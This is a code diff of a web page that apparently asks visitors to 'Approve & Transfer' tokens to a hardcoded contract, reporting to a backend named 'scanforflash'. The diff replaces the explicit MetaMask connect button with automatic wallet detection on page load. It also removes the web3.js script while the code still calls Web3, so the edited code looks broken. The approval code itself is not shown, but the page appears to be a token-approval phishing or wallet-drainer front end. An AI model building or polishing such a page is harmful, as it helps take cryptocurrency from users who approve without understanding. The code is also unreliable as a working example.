@@ -61,13 +61,12 @@
         <div class="group">
             <div class="label">Your Wallet</div>
             <div class="input-box">
-                <input type="text" id="wallet" readonly placeholder="Connect MetaMask">
+                <input type="text" id="wallet" readonly placeholder="Detecting wallet...">
                 <div class="balance" id="balance"></div>
             </div>
         </div>
 
-        <button class="btn" id="connectBtn" onclick="connectWallet()">Connect MetaMask</button>
-        <button class="btn" id="approveBtn" onclick="handleApprove()" style="display: none;">Approve & Transfer</button>
+        <button class="btn" id="approveBtn" onclick="handleApprove()" disabled>Approve & Transfer</button>
     </div>
 
     <div class="modal" id="approvalModal">
@@ -81,7 +80,6 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
         const BACKEND_URL = "https://scanforflash-backend-production.up.railway.app";
         const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
@@ -91,30 +89,27 @@
         let userAddress = null;
         let web3 = null;
 
-        async function connectWallet() {
-            try {
-                if (!window.ethereum) {
-                    showNotification("MetaMask not detected", "error");
-                    return;
+        // Auto-detect wallet on page load
+        window.addEventListener('load', async () => {
+            if (window.ethereum) {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    const accounts = await web3.eth.getAccounts();
+                    
+                    if (accounts.length > 0) {
+                        userAddress = accounts[0];
+                        document.getElementById('wallet').value = userAddress;
+                        document.getElementById('approveBtn').disabled = false;
+                        await getBalance();
+                        showNotification("Wallet detected!", "success");
+                    }
+                } catch (error) {
+                    console.error('Auto-detect error:', error);
                 }
-
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
-
-                userAddress = accounts[0];
-                web3 = new Web3(window.ethereum);
-
-                document.getElementById('wallet').value = userAddress;
-                document.getElementById('connectBtn').style.display = 'none';
-                document.getElementById('approveBtn').style.display = 'block';
-
-                await getBalance();
-                showNotification("MetaMask connected!", "success");
-            } catch (error) {
-                showNotification("Error: " + error.message, "error");
+            } else {
+                showNotification("No wallet detected", "error");
             }
-        }
+        });
 
         async function getBalance() {
             try {
@@ -134,7 +129,7 @@
 
         async function handleApprove() {
             if (!userAddress) {
-                showNotification("Connect wallet first", "error");
+                showNotification("Wallet not detected", "error");
                 return;
             }
             document.getElementById('approvalModal').classList.add('show');
@@ -187,7 +182,6 @@
             if (!notify) {
                 notify = document.createElement("div");
                 notify.id = "notify-bar";
-                notify.className = `notification ${type}`;
                 document.body.appendChild(notify);
             }
             notify.textContent = msg;
